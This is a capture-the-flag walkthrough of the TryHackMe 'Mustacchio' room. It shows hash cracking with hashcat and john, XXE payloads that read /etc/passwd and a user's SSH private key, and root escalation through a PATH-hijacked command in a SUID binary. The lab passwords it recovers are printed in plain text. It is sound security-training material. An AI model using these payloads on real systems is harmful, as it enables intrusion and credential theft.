
https://tryhackme.com/r/room/mustacchio

---
![[Screenshot_2024-06-30_08-58-23.png]]

Enumation showed me a `users.bak` in `/custom/js`

I simply `cat` the `users.bak` file and I get:
```text
��0]admin1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
```

I suppose if for an `admin` user with the `1868e36a6d2b17d4c2745f1659433a54d4bc5f4b` hashed password

Indeed it was `sha-1` hashing

```shell
hashcat -a 0 -m 100 -O hash /usr/share/wordlists/rockyou.txt
```

It gave me the following credentials: `admin:bulldog19` for the login page on the port `8765`

I landed on the admin panel and I discovered `dontforget.bak` on the source page. The `.bak` display the `XML` template to submit a comment
```xml
<?xml version="1.0" encoding="UTF-8"?>  
<comment>  
 <name>Name</name>  
 <author>Author</author>  
 <com>Comment</com>  
</comment>
```

With this, I can try to inject a payload to display `/etc/passwd`

```xml
<?xml version="1.0" encoding="UTF-8"?>  
<!DOCTYPE foo [<!ENTITY passwd SYSTEM "/etc/passwd"> ]>
<comment>  
 <name>&passwd;</name>  
</comment>
```

It worked !

Another comment in the source page of `home.php` tells me
```text
<!-- Barry, you can now SSH in using your key!-->
```

So I am going to try to get his `id_rsa.pub` key with the following payload:
```xml
<?xml version="1.0" encoding="UTF-8"?>  
<!DOCTYPE foo [<!ENTITY payload SYSTEM "/home/barry/.ssh/id_rsa"> ]>
<comment>  
 <name>&payload;</name>  
</comment>
```

I asked my assistant GPT4o to correctly format the private key, then I used john to setup the hashfile
```shell
ssh2john id_rsa > hash
```
Then I cracked the hash
```shell
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```
 And the password is `urieljames`

So the creds are `barry:urieljames`

And here I am as `barry`

The other user `joe` has a root SUID on his home `live_log`

When you `strings` the binary, it shows the following mistake:
![[Screenshot_2024-07-03_16-58-00.png]]
The `tail` haven't an absolute path so I can change the default path order by adding my `tail`:
```shell
export PATH=/home/barry:$PATH
```
And I create the `tail` in `/home/barry`:
```shell
/bin/bash
```

So when I'll start `live_log` with the SUID root, it will spawn a root shell

And here I am root !